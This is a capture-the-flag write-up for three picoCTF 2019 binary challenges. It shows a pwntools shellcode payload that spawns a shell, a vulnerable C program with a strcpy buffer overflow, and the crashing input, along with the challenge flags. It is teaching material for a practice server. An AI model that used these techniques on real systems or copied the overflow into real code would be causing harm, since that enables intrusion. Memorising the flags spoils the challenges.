<center><h1>Binary</h1></center>
<br><br>
<center><h2>handy-shellcode [50]</h2></center>
<br>
Q: This *[program](/picoctf2019/files/handyShellcodeVuln)* executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5 on the shell server. *[Source](/picoctf2019/files/handyShellcodeVuln.c)*.

A: It tells us exactly what to do. Easiest way to spawn a shell would be to use pwn tools with python. Log into the shell server and navigate to ```/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5``` which is where the ```vuln``` binary and ```flag.txt``` are stored. Here we are going to spawn our shell. Using the 4 lines of python code below we are able to grab the flag.
```
# cd /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5
/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5$ python
>>> from pwn import *
>>> sh = process('./vuln')
[x] Starting local process './vuln'
[+] Starting local process './vuln': pid 2276666
>>> sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
'Enter your shellcode'
>>> sh.interactive()
[*] Switching to interactive mode
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...

cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}
```
Flag:```picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}```
<br>
<center><h2>practice-run-1 [50]</h2></center>
<br>
Q: You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this *[program](/picoctf2019/files/run_this)* to receive a flag.

A: Two ways to do this.
1. Navigate to ```/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e``` and execute the program
```
# ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```
2. Download the file to your computer, make the file executable and then run it.
```
# chmod +x run_this
# ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```
Flag:```picoCTF{g3t_r3adY_2_r3v3r53}```
<br>
<center><h2>Overflow 0 [100]</h2></center>
<br>
Q: This should be easy. Overflow the correct buffer in this *[program](/picoctf2019/files/overflow0Vuln)* and get a flag. Its also found in /problems/overflow-0_3_dc6e55b8358f1c82f03ddd018a5549e0 on the shell server. *[Source](/picoctf2019/files/overflow0Vuln.c)*.

A: So this problem is actually very basic buffer overflow. Looking at the code we see that in the ```vuln``` function the ```buf``` variable was given 128 bytes of memory.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
Knowing this, if we input the program more data than it can handle it will cause it to spit out the flag. You could just enter 500 characters and be done with it but the exact number is 133 characters. The reason it is 133 and not 128 is simple. The program allocated 128 bytes of memory for the input but thats not all we have to overwrite. We also have to overwrite the memory address which on 32 bit architectures are 4 bytes long. So, 128 + 4 = 132 and we need to be greater than which is why 133 is the smallest number that can cause a buffer overflow.
```
# python -c 'print("A" * 133)' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{3asY_P3a5y1fcf81f9}
```
Flag:```picoCTF{3asY_P3a5y1fcf81f9}```
<br>
